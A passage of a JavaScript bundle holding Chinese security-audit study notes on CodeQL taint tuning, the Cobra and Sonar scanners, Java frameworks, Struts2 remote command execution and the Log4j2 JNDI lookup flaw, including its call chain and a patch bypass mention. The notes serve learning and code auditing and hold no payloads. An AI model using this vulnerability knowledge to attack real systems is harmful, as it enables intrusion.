                                              \u6BD4\u5982\uFF0C\u6211\u4EEC\u53EA\u9700\u8981\u5C06\u8FD9\u79CD\u590D\u5408\u7C7B\u578B\u52A0\u5165\u5230isSanitizer\u65B9\u6CD5\uFF0C\u5373\u53EF\u6D88\u9664\u8FD9\u79CD\u8BEF\u62A5\u3002
                                                      \u4EE5\u4E0A\u4EE3\u7801\uFF08\u7565\uFF09\u7684\u610F\u601D\u4E3A\uFF1A\u5982\u679C\u5F53\u524Dnode\u8282\u70B9\u7684\u7C7B\u578B\u4E3A\u57FA\u7840\u7C7B\u578B\uFF0C\u6570\u5B57\u7C7B\u578B\u548C\u6CDB\u578B\u6570\u5B57\u7C7B\u578B(\u6BD4\u5982List)\u65F6\uFF0C\u5C31\u5207\u65AD\u6570\u636E\u6D41\uFF0C\u8BA4\u4E3A\u6570\u636E\u6D41\u65AD\u6389\u4E86\uFF0C\u4E0D\u4F1A\u7EE7\u7EED\u5F80\u4E0B\u68C0\u6D4B\u3002
              5\u3001\u6F0F\u62A5\u89E3\u51B3
                      1\u3001\u4E3E\u4F8B\uFF0C\u6211\u4EEC\u53D1\u73B0\uFF0C\u5982\u4E0B\u7684SQL\u6CE8\u5165\u5E76\u6CA1\u6709\u88ABCodeQL\u6355\u6349\u5230\u3002
                              1\u3001\u6F0F\u62A5\u7406\u8BBA\u4E0A\u8BB2\u662F\u4E0D\u80FD\u63A5\u53D7\u7684\u3002\u5982\u679C\u51FA\u73B0\u8BEF\u62A5\u6211\u4EEC\u8FD8\u53EF\u4EE5\u901A\u8FC7\u4EBA\u5DE5\u7B5B\u9009\u6765\u89E3\u51B3\uFF0C\u4F46\u662F\u6F0F\u62A5\u4F1A\u5BFC\u81F4\u5F88\u591A\u6F0F\u6D1E\u6D41\u7ECF\u4E0B\u4E00\u4E2A\u73AF\u8282\u5230\u7EBF\u4E0A\uFF0C\u4ECE\u800C\u4EA7\u751F\u635F\u5931\u3002
                              2\u3001\u90A3\u6211\u4EEC\u5982\u679C\u901A\u8FC7CodeQL\u6765\u89E3\u51B3\u6F0F\u62A5\u95EE\u9898\u5462\uFF1F\u7B54\u6848\u5C31\u662F\u901A\u8FC7isAdditionalTaintStep\u65B9\u6CD5\u3002
                                      1\u3001\u5B9E\u73B0\u539F\u7406\u5C31\u4E00\u53E5\u8BDD\uFF1A
                                              \u65AD\u4E86\u5C31\u5F3A\u5236\u7ED9\u5B83\u63A5\u4E0A\u3002
                                      2\u3001\u4FEE\u590D\u793A\u4F8B\uFF1A
                                              1\u3001\u591A\u6B21\u6D4B\u8BD5\u4E4B\u540E\uFF0C\u6211\u8BA4\u5B9A\u662F\u56E0\u4E3Ausername.get()\u8FD9\u4E00\u6B65\u65AD\u6389\u4E86\u3002\u5927\u6982\u662F\u56E0\u4E3AOptional\u8FD9\u79CD\u7C7B\u578B\u7684\u4F7F\u7528\u6CA1\u6709\u5728CodeQL\u7684\u8BED\u6CD5\u5E93\u91CC\u3002
                                                      1\u3001\u90A3\u4E48\u8FD9\u91CC\u6211\u4EEC\u5F3A\u5236\u8BA9username\u6D41\u8F6C\u5230username.get()\uFF0C\u8FD9\u6837username.get()\u5C31\u53D8\u5F97\u53EF\u63A7\u4E86\u3002\u8FD9\u6837\u5E94\u8BE5\u5C31\u80FD\u8BC6\u522B\u51FA\u8FD9\u4E2A\u6CE8\u5165\u6F0F\u6D1E\u4E86\u3002
            6\u3001Lombok\u95EE\u9898
                      1\u3001Lombok\u662F\u4E00\u4E2A\u975E\u5E38\u6709\u540D\u7684Java\u7C7B\u5E93\u3002\u5B83\u901A\u8FC7\u7B80\u5355\u7684\u6CE8\u89E3\u6765\u5E2E\u52A9\u6211\u4EEC\u7B80\u5316\u6D88\u9664\u4E00\u4E9B\u5FC5\u987B\u6709\u4F46\u663E\u5F97\u5F88\u81C3\u80BF\u7684Java\u4EE3\u7801\u7684\u5DE5\u5177\u3002
                      2\u3001\u4F46\u662F\u7531\u4E8Elombok\u7684\u5B9E\u73B0\u673A\u5236\uFF0C\u5BFC\u81F4 \u300ACodeQL\u300B \u65E0\u6CD5\u83B7\u53D6\u5230lombok\u81EA\u52A8\u751F\u6210\u7684\u4EE3\u7801\uFF0C\u6240\u4EE5\u5C31\u5BFC\u81F4\u4F7F\u7528\u4E86lombok\u7684\u4EE3\u7801\u5373\u4F7F\u5B58\u5728\u6F0F\u6D1E\uFF0C\u4E5F\u65E0\u6CD5\u88AB\u8BC6\u522B\u7684\u95EE\u9898\u3002
                      3\u3001\u8FD8\u597DCodeQL\u5B98\u65B9\u7684issue\u91CC\u9762\uFF0C\u6709\u4EBA\u7ED9\u51FA\u4E86\u8FD9\u4E2A\u95EE\u9898\u7684\u89E3\u51B3\u529E\u6CD5\uFF1A
                              \u601D\u8DEF\uFF1A\u53BB\u6389\u4EE3\u7801\u91CC\u7684lombok\u6CE8\u89E3\uFF0C\u5E76\u8FD8\u539Fsetter\u548Cgetter\u65B9\u6CD5\u7684java\u4EE3\u7801\uFF0C\u4ECE\u800C\u4F7FCodeQL\u7684Flow\u6D41\u80FD\u591F\u987A\u5229\u8D70\u4E0B\u53BB\uFF0C\u4ECE\u800C\u68C0\u7D22\u5230\u5B89\u5168\u6F0F\u6D1E\u3002


  `),Object(u.c)("Cobra\uFF08\u773C\u955C\u86C7\uFF09",`

  Cobra
      \u8D44\u6599\uFF1A
              \u5199\u7684\u5F88\u4E71\uFF1Ahttps://blog.csdn.net/caiqiiqi/article/details/104158061
              \u975E\u5E38\u77ED\u7684\u7B80\u4ECB\uFF1Ahttps://blog.csdn.net/frog4/article/details/86580095
              \u4ED3\u5E93\u8D44\u6599\uFF1A
                      \u6E90\u7801\uFF1Ahttps://github.com/WhaleShark-Team/cobra
                      Lo\u5199\u7684\u4E00\u4E2A\u6539\u7248\uFF1Ahttps://github.com/LoRexxar/Cobra-W
              \u5B98\u7F51\u3001\u6587\u6863\uFF1Ahttp://cobra.feei.cn/

      \u4ECB\u7ECD\uFF1A
              0\u3001\u73B0\u5728\u5DF2\u7ECF\u505C\u6B62\u7EF4\u62A4\uFF01\uFF01\uFF01
                      \u4EC5\u505A\u7814\u7A76\u4F7F\u7528\uFF0C\u4E0D\u5728 \u300A\u751F\u4EA7\u73AF\u5883\u300B \u4F7F\u7528\u3002
              1\u3001\u5B9A\u4F4D\u4E8E\u9759\u6001\u4EE3\u7801\u5B89\u5168\u5206\u6790\u7684\u5DE5\u5177,\u76EE\u6807\u662F\u4E3A\u4E86\u627E\u51FA\u6E90\u4EE3\u7801\u4E2D\u5B58\u5728\u7684\u5B89\u5168\u9690\u60A3\u6216\u8005\u6F0F\u6D1E\u3002
              2\u3001\u5176\u4E3B\u8981\u539F\u7406\u662F\uFF1A
                      \u5229\u7528\u51FD\u6570\u5B9A\u4F4D\u53CA\u6B63\u5219\u8868\u8FBE\u5F0F\u626B\u63CF\u4EE3\u7801\u6587\u4EF6\uFF0C\u63D0\u793A\u53EF\u80FD\u5B58\u5728\u7684\u6F0F\u6D1E\uFF0C
              3\u3001\u4F7F\u7528python\u5F00\u53D1\uFF0C\u62E5\u6709\u652F\u6301\u5F00\u53D1\u8BED\u8A00\u591A\uFF0C\u5347\u7EA7\u7B80\u5355\u3001\u81EA\u5B9A\u4E49\u89C4\u5219 \u7B80\u5355\u7684\u7279\u70B9\u3002

      \u4F7F\u7528\uFF1A
              1\u3001\u5B9A\u4F4D\u662F\u5DE5\u5177\u7C7B\u8F6F\u4EF6\uFF0C\u867D\u7136\u5E26\u4E86\u4E00\u4E2A\u7BA1\u7406\u7684web\u754C\u9762\uFF0C\u4F46\u662F\u4E5F\u53EA\u80FD\u7B80\u5355\u770B\u4E0B\u6F0F\u6D1E\uFF0C\u6CA1\u6709\u4EFB\u4F55\u7BA1\u7406\u529F\u80FD\uFF0C
                      1\u3001\u53E6\u5728\u9879\u76EE\u6587\u4EF6\u8F83\u591A\u7684\u573A\u666F\u4E0B\uFF0C\u901F\u5EA6\u8F83\u6162\u3002
                      2\u3001\u56E0\u6B64\u5E76\u4E0D\u662F\u7C7B\u4F3CSonarQube\u7684\u5E73\u53F0\uFF0C\u5F53\u505A\u6316\u6D1E\u5DE5\u5177\u4F7F\u7528\u6700\u597D\u3002

              2\u3001CLI\u547D\u4EE4\u884C\uFF0C\u5E38\u7528\u6307\u4EE4\uFF1A
                      # \u626B\u63CF\u4E00\u4E2A\u6587\u4EF6\u5939\u7684\u4EE3\u7801
                      $ python cobra.py -t tests/vulnerabilities

                      # \u626B\u63CF\u4E00\u4E2AGit\u9879\u76EE\u4EE3\u7801
                      $ python cobra.py -t https://github.com/FeeiCN/grw.git

                      # \u626B\u63CF\u4E00\u4E2A\u6587\u4EF6\u5939\uFF0C\u5E76\u5C06\u626B\u63CF\u7ED3\u679C\u5BFC\u51FA\u4E3AJSON\u6587\u4EF6
                      $ python cobra.py -t tests/vulnerabilities -f json -o /tmp/report.json

                      # \u626B\u63CF\u4E00\u4E2AGit\u9879\u76EE\uFF0C\u5E76\u5C06\u626B\u63CF\u7ED3\u679CJSON\u6587\u4EF6\u63A8\u9001\u5230API\u4E0A
                      $ python cobra.py -f json -o http://push.to.com/api -t https://github.com/FeeiCN/vc.git

                      # \u626B\u63CF\u4E00\u4E2AGit\u9879\u76EE\uFF0C\u5E76\u5C06\u626B\u63CF\u7ED3\u679CJSON\u6587\u4EF6\u53D1\u9001\u5230\u90AE\u7BB1\u4E2D
                      $ python cobra.py -f json -o feei@feei.cn -t https://github.com/FeeiCN/grw.git

                      # \u626B\u63CF\u4E00\u4E2A\u6587\u4EF6\u5939\u4EE3\u7801\u7684\u67D0\u4E24\u79CD\u6F0F\u6D1E
                      $ python cobra.py -t tests/vulnerabilities -r cvi-190001,cvi-190002

                      # \u5F00\u542F\u4E00\u4E2ACobra HTTP Server\uFF0C\u7136\u540E\u53EF\u4EE5\u4F7F\u7528API\u63A5\u53E3\u6765\u6DFB\u52A0\u626B\u63CF\u4EFB\u52A1
                      $ python cobra.py -H 127.0.0.1 -P 8888

                      # \u67E5\u770B\u7248\u672C
                      $ python cobra.py --version

                      # \u67E5\u770B\u5E2E\u52A9
                      $ python cobra.py --help

                      # \u626B\u63CF\u4E00\u4E2AGit\u9879\u76EE\uFF0C\u626B\u63CF\u5B8C\u6BD5\u81EA\u52A8\u5220\u9664\u7F13\u5B58
                      $ python cobra.py -t http://github.com/xx/xx.git -dels

                      # \u626B\u63CFgitlab\u5168\u90E8\u9879\u76EE\uFF0C\u914D\u7F6E\u597Dconfig\u4E2Dprivate_token\uFF0Cgitlab_url\uFF0Ccobra_ip
                      $ python git_projects.py

                      # \u81EA\u52A8\u751F\u6210Cobra\u626B\u63CF\u5468\u62A5\u53D1\u9001\u81F3\u6307\u5B9A\u90AE\u7BB1\uFF0C\u9700\u8981\u914D\u7F6E\u597Dconfig\u4E2D\u7684SMTP\u670D\u52A1\u5668\u4FE1\u606F
                      $ python cobra.py -rp

              3\u3001API\u4F7F\u7528\uFF0C\u5E38\u7528\u63A5\u53E3\uFF1A
                      \u63A5\u53E3\uFF1A
                              1\u3001\u6DFB\u52A0\u626B\u63CF\u4EFB\u52A1
                                      \u63A5\u53E3\uFF1A/api/add \u65B9\u6CD5\uFF1APOST \u7C7B\u578B\uFF1AJSON
                              2\u3001\u67E5\u8BE2\u626B\u63CF\u4EFB\u52A1\u72B6\u6001
                                      \u63A5\u53E3\uFF1A/api/status \u65B9\u6CD5\uFF1APOST \u7C7B\u578B\uFF1AJSON
                      \u5B8C\u6574\u7684\u4F8B\u5B50\uFF1A
                              \u542F\u52A8HTTP\u670D\u52A1
                                      python cobra.py -H 127.0.0.1 -P 8888
                              \u6DFB\u52A0\u626B\u63CF\u4EFB\u52A1
                                      # \u6DFB\u52A0\u4E00\u6761\u4EFB\u52A1
                                      curl -H "Content-Type: application/json" -X POST -d '{"key":"your_secret_key", "target":"https://github.com/FeeiCN/grw.git:master", "rule": "cvi-130003,cvi-130004"}' http://127.0.0.1:8888/api/add
                                      # \u6DFB\u52A0\u591A\u6761\u4EFB\u52A1
                                      curl -H "Content-Type: application/json" -X POST -d '{"key":"your_secret_key", "target":["https://github.com/WhaleShark-Team/cobra.git:master", "https://github.com/FeeiCN/grw.git:master"]}' http://127.0.0.1:8888/api/add
                              \u67E5\u8BE2\u4EFB\u52A1\u72B6\u6001
                                      curl -H "Content-Type: application/json" -X POST -d '{"key":"your_secret_key","sid": "a938e29vdse8"}' http://127.0.0.1:8888/api/status
                              Web \u62A5\u544A\u9875
                                      http://127.0.0.1:8888/?sid=afbe69p7dxva
                              Web \u6307\u5B9A\u65F6\u95F4\u6BB5\u6F0F\u6D1E\u7EDF\u8BA1
                                      http://127.0.0.1:8888/report

  `),Object(u.c)("\u300ASonar\u5BB6\u65CF\u300B\u3001\u300ASonarQube\u300B\u3001\u300ASonarSource\u300B\u3001\u300ASonarLint\u300B\u3001\u300ASonarCloud\u300B",`

      \u8D44\u6599\uFF1A
              https://rules.sonarsource.com/

      Sonar\u5BB6\u65CF
              Sonar\u65D7\u4E0B\uFF0C\u6709\u591A\u6B3E \u9759\u6001\u4EE3\u7801 \u76F8\u5173\u7684\u5DE5\u5177\u548C\u4EA7\u54C1\u3002

      SonarQube
              - \u672C\u8D28\u4E0A\uFF0C\u662F\u3010\u6301\u7EED\u96C6\u6210\u3011\u4E4B\u3010\u4EE3\u7801\u8D28\u91CF\u7BA1\u7406\u3011\u7684\u5DE5\u5177\u3002
                  - \u4E5F\u5C31\u662F\u8BF4\uFF0C\u504F\u5411\u4E8E\u3010\u5F00\u53D1\u4FA7\u3011\u7684\u3010\u4EE3\u7801\u89C4\u8303\u68C0\u67E5\u3011\u3002

              \u652F\u6301\u300A\u81EA\u6258\u7BA1\u300B\u3002

              \u4F1A\u751F\u6210\u4E00\u4EFD\u62A5\u544A\uFF0C\u7EDF\u8BA1\u4E86\u54EA\u91CC\u6709\u4EE3\u7801\u4E0D\u89C4\u8303\u95EE\u9898\uFF0C\u548C\u4E00\u4E9B\u4FEE\u590D\u5EFA\u8BAE\u3002

      SonarSource
              \u8D85\u8FC7 30 \u79CD\u7F16\u7A0B\u8BED\u8A00\u76844800 \u591A\u4E2A\u9759\u6001\u5206\u6790\u89C4\u5219
              \u89E3\u51B3\u4EE3\u7801\u8D28\u91CF\u95EE\u9898\u3002
              \u89E3\u51B3\u5B89\u5168\u6F0F\u6D1E\u95EE\u9898\u3002

      SonarLint
              \u7528\u4E8E Idea\u3001Eclipse\u3001VSCode\u3001VS \uFF0C\u76F8\u5173\u7684IDE\u63D2\u4EF6\u3002\u7528\u4E8E\u5F00\u53D1\u65F6\u68C0\u67E5\u3002

      SonarCloud
              \u7528\u4E8E\u4E91\u4E0A\uFF0C\u7528\u4E8E \u81EA\u52A8\u5316\u7EE7\u627F\u3001\u81EA\u52A8\u5316\u90E8\u7F72 \u7684\u6D41\u7A0B\u3002
              \u4E0E\u60A8\u73B0\u6709\u7684\u57FA\u4E8E\u4E91\u7684 CI/CD \u5DE5\u4F5C\u6D41\u7A0B\u5B8C\u7F8E\u642D\u914D\u3002

  `),Object(u.c)("\u5947\u5B89\u4FE1\u4EE3\u7801\u536B\u58EB",`
      - \u7C7B\u4F3C\u4E8E\u4E00\u4E2A\u3010Admin\u540E\u53F0\u3011\u7684\u5F62\u5F0F\u3002
      - \u5BA2\u6237\u90A3\u8FB9\uFF0C\u4ED6\u4EEC\u81EA\u5DF1\u4E0A\u4F20\u9879\u76EE\uFF0C\u8FDB\u884C\u626B\u63CF\u5B8C\u6210\u4E4B\u540E\u3002
          - \u4F60\u7528\u4F60\u7684\u3010\u6D4B\u8BD5\u8D26\u53F7\u3011\u767B\u5F55\u3010\u540E\u53F0\u3011\u3002\u53EF\u4EE5\u770B\u5230\u3010\u5F85\u5BA1\u8BA1\u9879\u76EE\u3011\u3002
              - \u5F62\u5F0F\u662F\u3010\u4E00\u4E2A\u5F85\u5BA1\u8BA1\u95EE\u9898\u7684\u6E05\u5355\u5217\u8868\u3011\uFF08\u53EF\u80FD\u51E0\u767E\u4E0A\u5343\u4E2A\uFF09\uFF0C\u6BCF\u4E2A\u70B9\u5F00\u4E4B\u540E\uFF0C\u6709\u8BE6\u60C5\u67E5\u770B\u3002
                  - \u8BE6\u60C5\u91CC\u9762\uFF1A
                      - \u6709\u3010\u6E90\u4EE3\u7801\uFF08\u6574\u4E2A\u5355\u6587\u4EF6\uFF09\u3011\u3002
                      - \u6709\u3010\u4EE3\u7801\u536B\u58EB\u3011\u8BA4\u4E3A\u6709\u95EE\u9898\u7684\u3010\u90A3\u4E00\u884C\u6807\u8BB0\u3011\u3002
                  - \u4F60\u9700\u8981\u505A\u7684\u4E8B\u60C5\uFF1A
                      - \u5224\u65AD\uFF0C\u8FD9\u4E2A\u3010\u6709\u95EE\u9898\u7684\u4E00\u884C\u3011\u662F\u5426\u771F\u7684\u6709\u95EE\u9898\uFF1A
                          - \u5982\u679C\u662F\u8BEF\u62A5\uFF0C\u4F60\u5728\u3010\u64CD\u4F5C\u4E00\u680F\u3011\u9009\u62E9\u3010\u662F\u8BEF\u62A5\u3011\uFF0C\u70B9\u51FB\u63D0\u4EA4\u3002
                          - \u5982\u679C\u662F\u3010\u771F\u6709\u95EE\u9898\u3011\uFF0C\u4F60\u5728\u3010\u64CD\u4F5C\u4E00\u680F\u3011\u9009\u62E9\u3010\u6709\u95EE\u9898\u3011\uFF0C\u5E76\u4E14\u63D0\u51FA\u3010\u4FEE\u590D\u5EFA\u8BAE\uFF08\u4E00\u6BB5\u8BDD\u5373\u53EF\uFF09\u3011\u3002
          - \u7136\u540E\uFF0C\u5982\u679C\u6709\u3010\u591A\u4E2A\u5F85\u5BA1\u8BA1\u9879\u76EE\u3011\uFF0C\u5C31\u628A\u4E0A\u8FF0\u7684\u8FC7\u573A\uFF0C\u91CD\u590DN\u904D\u3002
              - \u64CD\u4F5C\u8D77\u6765\u8FD8\u662F\u5F88\u7B80\u5355\u7684\uFF0C\u51E0\u5206\u949F\u5C31\u80FD\u4E0A\u624B\u3002
  `))]),\u5F00\u53D1\u6846\u67B6\u7BC7____\u4EE5\u53CA____\u4E2D\u95F4\u4EF6\u7BC7:G([Object(u.a)(C||(C=Object(t.a)([`
  \u3010\u5F00\u53D1\u6846\u67B6\u3011  \uFF08\u5176\u5B9E\u548C\u3010\u4E2D\u95F4\u4EF6\u3011\u4E5F\u5DEE\u4E0D\u591A\uFF09

  \u3010Spring\u3011\u3010SpringBoot\u3011\u3010SpringCloud\u3011\u3001\u3010Mybatis\u3011
  \u3010log4j\u3011\u3001\u3010log4j2\u3011
  \u3010spring4shell\u3011

  \u3010struts2\u3011\u3001\u3010Hibernate\u3011

  \u3010\u5B89\u5168\u5904\u7406\u7C7B\u3011


  servlet3
      xml\u914D\u7F6E\u3001\u6CE8\u89E3\u914D\u7F6E\u3001
          https://www.it610.com/article/1204935926728466432.htm
          https://blog.csdn.net/SouthWind0/article/details/89455611
          https://juejin.cn/post/7053041782888054792


  \u300AJava\u81EA\u5E26\u7684\u5B89\u5168\u5904\u7406\u7C7B\u300B`,`


  \u300ASSM  SpringMVC + Spring + Mybatis\u300B`,`



  \u300AStruts2\u5F00\u53D1\u6846\u67B6\uFF0C\u8BE6\u89E3\u300B`,`

  \u300ASSH  Struts2 + Spring + Hibernate\u300B`,`

  \u300AStruts2\u4E2D\u95F4\u4EF6\u6F0F\u6D1E\u300B`,`


  \u300Alog4j2\u300B`,`


 \u300ASpring4Shell\u300B`,`


  \u300ASpringCloud\u300B`,`



  `])),Object(u.c)("Java\u81EA\u5E26\u7684\u5B89\u5168\u5904\u7406\u7C7B",`
      SecurityManager\uFF1A
          \u5B83\u4E3A\u5176\u4ED6Java API\u63D0\u4F9B\u76F8\u5E94\u7684\u63A5\u53E3\uFF0C\u4F7F\u4E4B\u53EF\u4EE5\u68C0\u67E5\u67D0\u9879\u64CD\u4F5C\u80FD\u5426\u6267\u884C\uFF0C\u5145\u5F53\u4E86\u5B89\u5168\u7BA1\u7406\u5668\u7684\u89D2\u8272\u3002
  `),Object(u.c)("SSM  SpringMVC + Spring + Mybatis",`
      SpringMVC + Spring + Mybatis

      SpringMVC\uFF1A
              \u57FA\u4E8EMVC\u8BBE\u8BA1\u6A21\u5F0F\u7684\u8BF7\u6C42\u9A71\u52A8\u7C7B\u578B\u7684\u8F7B\u91CF\u7EA7Web\u6846\u67B6

      MyBatis
      `.concat(Cu,`
  `)),Object(u.c)("Struts2\u5F00\u53D1\u6846\u67B6\uFF0C\u8BE6\u89E3",`
    \u70B9\u51FB\u4E0B\u65B9\uFF0C\u5C55\u5F00\u8BE6\u60C5
  `,{otherCps:[ru]}),Object(u.c)("SSH  Struts2 + Spring + Hibernate",`
    Struts2+Spring+Hibernate\u4E09\u4E2A\u5F00\u6E90\u6846\u67B6\u6574\u5408\u800C\u6210\u3002

        \u540E\u56E0Struts2\u7206\u51FA\u4F17\u591A\u9AD8\u5371\u6F0F\u6D1E\uFF0C\u5BFC\u81F4\u76EE\u524DSSM\u9010\u6E10\u4EE3\u66FFSSH\u6210\u4E3A\u4E3B\u6D41\u5F00\u53D1\u6846\u67B6\u7684\u9009\u62E9\u3002

  `,{otherCps:[ru,Su]}),Object(u.c)("Struts2\u4E2D\u95F4\u4EF6\u6F0F\u6D1E",`

  Struts2\u4E2D\u95F4\u4EF6\u6F0F\u6D1E
      \u8D44\u6599\uFF1A
              \u975E\u5E38\u5168\u9762\uFF1A
                      https://tttang.com/archive/1583/
                      https://javasec.org/java-vuls/Struts/Struts2-5.html

              \u6709\u4E9B\u6CA1\u539F\u7406\u3001\u6CA1\u6982\u8FF0\u4ECB\u7ECD\uFF1A
                      https://www.freebuf.com/articles/web/280245.html

              \u6574\u4F53\u4E00\u822C\uFF0C\u4F46\u67E5\u6F0F\u8865\u7F3A\u4E86\u4E00\u90E8\u5206\uFF1A
                      https://www.secrss.com/articles/24780

              \u7ED9\u51FA\u4E86\u8F83\u591A\u7684payload\uFF0C\u7136\u540E\u589E\u52A0\u4E86\u4E00\u4E9BCVE\u7F16\u53F7\uFF1A
                      https://www.anquanke.com/post/id/266386

              \u5BF9\u4E00\u4E9B\u51B7\u95E8\u6D1E\u7684\u8865\u5145\uFF1A
                      https://www.anquanke.com/post/id/258953


      \u7B80\u4ECB\uFF1A
              Struts2\u8FDC\u7A0B\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E
                      \u6F0F\u6D1E\u63CF\u8FF0
                              Struts2\u8FDC\u7A0B\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\u662F\u6307\u4EE3\u7801\u672A\u5BF9\u7528\u6237\u53EF\u63A7\u53C2\u6570\u505A\u8FC7\u6EE4\uFF0C\u5BFC\u81F4\u76F4\u63A5\u5E26\u5165\u6267\u884C\u547D\u4EE4\u7684\u4EE3\u7801\u4E2D\uFF0C\u53EF\u88AB\u7528\u6765\u6267\u884C\u4EFB\u610F\u547D\u4EE4

      \u5176\u5B83\u8D44\u6599
              \u8FC7\u6EE4\u5668\u7684\u67E5\u627E\u3002xml\u6587\u4EF6\u3002\u641C\u7D22\u6CE8\u89E3\u3002\u8FD8\u6709 inspect \u547D\u4EE4\u3002
                      https://blog.csdn.net/lianghecai52171314/article/details/102897546
              \u63A5\u53E3\u5730\u5740\uFF1A
                      https://blog.csdn.net/Protein2017/article/details/90038720
              \u8DEF\u5F84\u62FC\u63A5
                      \uFF08Struct2\u4E0B\uFF0C\u6709\u5F88\u591A\u52A8\u6001\u8DEF\u5F84\u7684\u62FC\u63A5\uFF09\u3002


  `,{otherCps:v.a.createElement(v.a.Fragment,null,Y)}),Object(u.c)("Spring________log4j2",`

  \u539F\u7406\uFF1A
          1\u3001\u5728 Log4j2 \u4E2D\u63D0\u4F9B\u7684\u4F17\u591A\u7279\u6027\u4E2D\uFF0C\u5176\u4E2D\u4E00\u4E2A\u5C31\u662F Property Support\u3002\u8FD9\u4E2A\u7279\u6027\u8BA9\u4F7F\u7528\u8005\u53EF\u4EE5\u5F15\u7528\u914D\u7F6E\u4E2D\u7684\u5C5E\u6027\uFF0C\u6216\u4F20\u9012\u7ED9\u5E95\u5C42\u7EC4\u4EF6\u5E76\u52A8\u6001\u89E3\u6790\u3002
                  \u8FD9\u4E9B\u5C5E\u6027\u6765\u81EA\u4E8E\u914D\u7F6E\u6587\u4EF6\u4E2D\u5B9A\u4E49\u7684\u503C\u3001\u7CFB\u7EDF\u5C5E\u6027\u3001\u73AF\u5883\u53D8\u91CF\u3001ThreadContext\u3001\u548C\u4E8B\u4EF6\u4E2D\u5B58\u5728\u7684\u6570\u636E\uFF0C\u7528\u6237\u4E5F\u53EF\u4EE5\u63D0\u4F9B\u81EA\u5B9A\u4E49\u7684 Lookup \u7EC4\u4EF6\u6765\u914D\u7F6E\u81EA\u5B9A\u4E49\u7684\u503C\u3002
          2\u3001\u8FD9\u4E2A Lookup & Substitution \u7684\u8FC7\u7A0B\uFF0C\u5C31\u662F\u672C\u6B21\u6F0F\u6D1E\u7684\u5173\u952E\u70B9\u3002\u63D0\u4F9B Lookup \u529F\u80FD\u7684\u7EC4\u4EF6\u9700\u8981\u5B9E\u73B0 org.apache.logging.log4j.core.lookup.StrLookup \u63A5\u53E3\uFF0C\u5E76\u901A\u8FC7\u914D\u7F6E\u6587\u4EF6\u8FDB\u884C\u8BBE\u7F6E\u3002\u5728\u6700\u65B0\u7684\u5B98\u65B9\u6587\u6863 Lookups \u4E2D\uFF0C\u5217\u4E3E\u4E86 Log4j2 \u652F\u6301\u7684 Context Map\u3001Date\u3001Docker\u3001Environment\u3001Event\u3001Java\u3001Jndi\u3001JVM Input Arguments\u3001Kubernetes\u3001Log4j Configuration Location\u3001Main Arguments\u3001Map\u3001Marker\u3001Spring Boot \u3001Structured Data\u3001System Properties\u3001Lower\u3001Upper\u3001Web \u5982\u6B64\u591A\u79CD\u7684\u5C5E\u6027\u67E5\u627E\u53CA\u66FF\u6362\u9009\u9879\u3002
                  \u800C\u5176\u4E2D\u6240\u652F\u6301\u7684 Jndi \u5C31\u662F\u672C\u6B21\u6F0F\u6D1E\u7684\u89E6\u53D1\u70B9\u3002

  \u6F0F\u6D1E\u89E6\u53D1\u70B9\uFF1A
          1\u3001Log4j2 \u5173\u4E8E Lookup \u529F\u80FD\u7684\u4F7F\u7528\u4EE5\u53CA\u6F0F\u6D1E\u7684\u89E6\u53D1\uFF0C\u5305\u62EC\u51E0\u4E2A\u5173\u952E\u70B9\uFF0C\u8FD9\u91CC\u4F9D\u6B21\u6765\u8FDB\u884C\u5206\u6790\u3002
                  1\u3001\u65E5\u5FD7\u8BB0\u5F55/\u89E6\u53D1\u70B9
                          \u901A\u5E38\u6211\u4EEC\u4F7F\u7528 LogManager.getLogger() \u65B9\u6CD5\u6765\u83B7\u53D6\u4E00\u4E2A Logger \u5BF9\u8C61\uFF0C\u5E76\u8C03\u7528\u5176 debug/info/error/warn/fatal/trace/log \u7B49\u65B9\u6CD5\u8BB0\u5F55\u65E5\u5FD7\u7B49\u4FE1\u606F\u3002
                  2\u3001\u6D88\u606F\u683C\u5F0F\u5316
                          Log4j2 \u4F7F\u7528 org.apache.logging.log4j.core.pattern.MessagePatternConverter \u6765\u5BF9\u65E5\u5FD7\u6D88\u606F\u8FDB\u884C\u5904\u7406\uFF0C\u5728\u5B9E\u4F8B\u5316 MessagePatternConverter \u65F6\u4F1A\u4ECE Properties \u53CA Options \u4E2D\u83B7\u53D6\u914D\u7F6E\u6765\u5224\u65AD\u662F\u5426\u9700\u8981\u63D0\u4F9B Lookups \u529F\u80FD\u3002
                  3\u3001\u5B57\u7B26\u66FF\u6362
                          Log4j2 \u63D0\u4F9B Lookup \u529F\u80FD\u7684\u5B57\u7B26\u66FF\u6362\u7684\u5173\u952E\u5904\u7406\u7C7B\uFF0C\u4F4D\u4E8Eorg.apache.logging.log4j.core.lookup.StrSubstitutor\uFF0C\u9996\u5148\u6765\u770B\u4E00\u4E0B\u8FD9\u4E2A\u7C7B\u3002
                  4\u3001Lookup \u5904\u7406
                          Log4j2 \u4F7F\u7528 org.apache.logging.log4j.core.lookup.Interpolator \u7C7B\u6765\u4EE3\u7406\u6240\u6709\u7684 StrLookup \u5B9E\u73B0\u7C7B\u3002\u4E5F\u5C31\u662F\u8BF4\u5728\u5B9E\u9645\u4F7F\u7528 Lookup \u529F\u80FD\u65F6\uFF0C\u7531 Interpolator \u8FD9\u4E2A\u7C7B\u6765\u5904\u7406\u548C\u5206\u53D1\u3002
                  5\u3001JNDI \u67E5\u8BE2
                          Log4j2 \u4F7F\u7528 org.apache.logging.log4j.core.net.JndiManager \u6765\u652F\u6301 JDNI \u76F8\u5173\u64CD\u4F5C

  \u7206\u53D1\u4E86\u591A\u4E2A\u7248\u672C\u7684\u6F0F\u6D1E\uFF0C\u4EE5\u4E0B\u5206\u522B\u4ECB\u7ECD\uFF1A  \uFF08\u540C\u65F6\uFF0C\u4E5F\u662F \u5B98\u65B9\u4FEE\u590D \u4E0E \u9ED1\u5BA2\u6316\u6398\u6F0F\u6D1E \u7684\u5BF9\u6297\u8FC7\u7A0B\uFF09
          1\u3001 \u300Arc1\u8865\u4E01\u300B \u53CA\u7ED5\u8FC7
                  1\u3001\u5728\u6F0F\u6D1E\u906D\u5230\u62AB\u9732\u540E\uFF0CLog4j2 \u5B98\u65B9\u53D1\u5E03\u4E86 log4j-2.15.0-rc1 \u5B89\u5168\u66F4\u65B0\u5305\uFF0C\u4F46\u7ECF\u8FC7\u7814\u7A76\u540E\u53D1\u73B0\u5728\u5F00\u542F lookup \u914D\u7F6E\u65F6\uFF0C\u53EF\u4EE5\u88AB\u7ED5\u8FC7\u3002
